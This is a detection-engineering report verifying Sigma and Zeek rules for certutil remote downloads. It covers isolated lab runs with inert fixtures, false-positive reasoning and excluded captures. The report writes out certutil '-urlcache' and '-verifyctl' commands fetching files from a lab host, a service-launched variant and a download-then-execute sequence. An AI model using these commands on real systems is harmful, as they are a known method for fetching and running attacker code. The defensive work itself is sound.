# Certutil remote-download verification

Five new, independently rolled-back runs verify the remote-download shapes
that the prior lab-shaped rule missed: canonical `-urlcache -f` without
`-split`, `-verifyctl -f`, a `services.exe` parent, Kali-only HTTPS, and an
inert PE download followed by execution. Every accepted pcap and its Sysmon
EID 3 attribution passed the post-run lab-scope gate.

| Run | Command / action | Network | Files | Registry | Process | Parent-child |
|---|---|---|---|---|---|---|
| URL cache, no split | `certutil.exe -urlcache -f http://192.168.1.50:18081/benign-stage.txt C:\lab\urlcache-no-split.txt` | 2 EID 3; 2 Zeek HTTP | destination + INetCache | certutil API state | certutil EID 1 | PowerShell → certutil |
| Verify CTL | `certutil.exe -verifyctl -f http://192.168.1.50:18081/benign-stage.txt C:\lab\` | 1 EID 3; 1 Zeek HTTP | Cryptnet cache metadata/content | certutil API state | certutil EID 1 | PowerShell → certutil |
| Service parent | temporary `CertutilLabDownload` service whose ImagePath is the canonical command | 1 EID 3; 2 Zeek HTTP | cache + destination | service key + certutil API state | certutil EID 1 | **services.exe → certutil** |
| HTTPS | `certutil.exe -urlcache -f https://certutil.lab:18443/benign-stage.txt C:\lab\https-stage.txt` | 2 EID 3; 2 TLS; 1 x509 | cache + destination | trust/API state | certutil EID 1 | PowerShell → certutil |
| Download→execute | canonical download of `inert-marker.exe`, SHA-256 gate, then execute | 2 EID 3; 2 Zeek HTTP | PE + marker file | certutil API state; PE none | certutil + PE EID 1 | both are ordered PowerShell children |

The `-verifyctl` run is intentionally nuanced. This Windows build documents
the second positional argument as a certificate directory, not an output
file. An initial attempt with a nonexistent file path returned
`ERROR_FILE_NOT_FOUND` before networking. With existing `C:\lab\`, the HTTP
retrieval and cache writes occurred; certutil then returned
`CRYPT_E_ASN1_BADTAG` because the inert text fixture is not a CTL. The process
and network download form is nevertheless directly observed.

The service run created certutil through Service Control Manager. Sysmon
recorded `ParentImage=C:\Windows\System32\services.exe`, and the download
completed with the expected hash even though SCM reported that certutil is
not service-aware after it exited. This evidence contradicts the old
shell/script-host constraint, so `selection_parent` was removed entirely.

The 15,360-byte PE was compiled on Kali from `fixtures/inert-marker.c`. Its
downloaded SHA-256 matched the build hash
`4C42BCE005BCF18EBFE85229774D7A5221C5C8C30ACE4BFC031B23A47A7357A2`.
It exited 0 after writing only the expected 38-byte marker. This adds PE
identity, executable file-delete metadata, process start, and
download-path→image correlation that the earlier 3,768-byte text fixture
could not provide. No new standalone Sigma rule was added for the sequence:
portable Sigma cannot bind a parsed destination token in one command line to
a later `Image` value, while a generic “user-writable PE executed” rule would
be a broad hunt that does not characterize certutil. The correlation is
documented for backends that support field-to-field sequence joins.

## Precision and rule changes

The process rule now requires certutil identity plus any one of `urlcache`,
`verifyctl`, or `URL` (with `windash`) plus `http`; it no longer requires
`-split`, `-f`, or any parent. The old 0/23,695 measurement belonged to an
overfit shell-launched, all-three-switch rule and was not evidence of real
precision. The broadened rule is remeasured on this branch and its provenance
is recorded in `verification.json`. It matched 0 of 23,695 baseline process
events and the attack sample, but the baseline contains no benign certutil
process at all. Its FP likelihood is therefore `medium`, reflecting recurring
legitimate PKI, CTL, enrollment, deployment, and troubleshooting retrievals
rather than treating an empty certutil denominator as proof of low noise.

The Cryptnet cache-content rule remains a low-level hunt: legitimate certutil
CRL, CTL, certificate-chain, enrollment, and troubleshooting retrievals can
all match. The `Microsoft-CryptoAPI/` Zeek rule remains a high-FP, low-level
hunt because that User-Agent is normal Windows certificate-chain traffic. A
new alert-tier Zeek rule covers the exact `CertUtil URL Agent` value observed
in the URL-cache, service-parent, and PE runs; it is more certutil-specific,
although benign administrative certutil retrievals can still match.

## Safety and excluded attempts

Two timing/isolation probes were rejected by `check-lab-scope.py` and are not
used as verification evidence. Windows background services contacted a public
DNS resolver and Microsoft/Akamai HTTP(S) endpoints during one longer capture;
a second short capture contained responder-only packets from pre-existing
sessions. Certutil itself contacted only Kali, but the mechanical Zeek gate
correctly blocked both captures. Work stopped and VM 104 was rolled back after
each. The accepted method cleared the default gateway, reset the adapter,
removed default routes, waited for quiescence, and only then captured; all five
accepted reports read `PASS`.

The committed evidence contains selected telemetry fields, hashes, and a
sanitized Zeek connection log only. Raw PCAP, EVTX, combined exports,
certificate/key material, and packet content are not committed. Public-domain
reputation, internet rarity, and real-public-CA TLS signals are out of lab
scope because payload delivery was required to remain on Kali.
